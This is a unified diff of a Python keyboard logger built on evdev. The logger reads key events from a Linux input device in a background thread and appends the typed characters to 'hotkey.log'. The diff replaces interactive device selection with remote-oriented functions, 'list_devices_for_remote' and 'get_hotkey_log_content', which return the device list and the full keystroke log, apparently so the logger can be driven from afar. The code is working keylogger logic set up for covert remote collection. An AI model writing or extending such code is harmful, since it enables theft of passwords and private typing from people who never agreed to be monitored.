@@ -82,44 +82,37 @@ shift_map = {
     "KEY_ENTER": "\n",
 }
 
-def choose_keyboard():
-    devices = [InputDevice(path) for path in list_devices()]
-    for i, dev in enumerate(devices):
-        print(f"{i}: {dev.path} - {dev.name}")
-
-    choice = int(input("Select keyboard device: "))
-    return devices[choice]
-
-
-# Global variables to control the logger from main.py
 logger_stop_event = None
 logger_thread = None
+logger_device = None
+
+
+def list_devices_for_remote():
+    devices = [InputDevice(path) for path in list_devices()]
+    lines = [f"{i}: {dev.path} - {dev.name}" for i, dev in enumerate(devices)]
+    return "\n".join(lines), devices
 
 
 def start_logger(log_file="hotkey.log"):
-    """Start the keyboard logger in background"""
-    global logger_stop_event, logger_thread
+    global logger_stop_event, logger_thread, logger_device
 
     logger_stop_event = threading.Event()
 
-    # Add start timestamp
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     with open(log_file, "a", encoding="utf-8") as f:
         f.write(f"Start: {timestamp}\n\n")
 
     def logging_thread():
         try:
-            dev = choose_keyboard()
-            print(f"✅ Listening on {dev.path} - {dev.name}")
-            print("Keyboard logger is now running in background.\n")
+            print(f"✅ Listening on {logger_device.path} - {logger_device.name}")
+            print("Keyboard logger running in background.\n")
 
             shift = False
             caps = False
 
-            for event in dev.read_loop():
+            for event in logger_device.read_loop():
                 if logger_stop_event.is_set():
                     break
-
                 if event.type != ecodes.EV_KEY:
                     continue
 
@@ -175,10 +168,20 @@ def start_logger(log_file="hotkey.log"):
 
 
 def stop_logger():
-    """Stop the keyboard logger"""
-    global logger_stop_event
+    global logger_stop_event, logger_thread
     if logger_stop_event:
         logger_stop_event.set()
         if logger_thread and logger_thread.is_alive():
-            logger_thread.join(timeout=2)
-        print("Stop command sent to logger.")
+            logger_thread.join(timeout=3)
+        logger_stop_event = None
+        logger_thread = None
+
+
+def get_hotkey_log_content(log_file="hotkey.log"):
+    try:
+        with open(log_file, "r", encoding="utf-8") as f:
+            return f.read()
+    except FileNotFoundError:
+        return "No hotkey.log found."
+    except Exception as e:
+        return f"Error reading log: {e}"
